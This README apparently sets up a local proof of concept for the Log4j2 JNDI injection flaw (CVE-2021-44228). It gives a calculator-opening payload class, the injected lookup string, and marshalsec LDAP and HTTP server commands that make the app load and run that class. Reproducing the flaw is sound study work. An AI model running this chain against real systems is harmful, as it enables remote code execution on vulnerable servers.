## log4j2-vulnerability-reproduce

Exploit.java
**Bad code** which opens Calculator on Mac.
```java
java.lang.Runtime.getRuntime().exec(new String[] { "open", "-a", "Calculator" });
```

Log4j2Vul.java
Print some log which the log message may come from user input.
```java
logger.info("${jndi:ldap:127.0.0.1/anystring}");
```

Expose the class file to http access
```
./gradle build
cd build/classes/java/main
python3 -m http.server 7374
```

## marshalsec
Download source and make package
```
git clone https://github.com/mbechler/marshalsec.git
cd marshalsec
mvn clean package -DskipTests
```

Start LDAP server and redirect to http server
```
java -cp target/marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.jndi.LDAPRefServer http://127.0.0.1:7374/#Exploit 384
```

## Reproduce Log4j2 CVE-2021-44228
Run Log4j2Vul
```
./gradlew runLog4j2WithJavaExec
```
And you will see Calculator opened.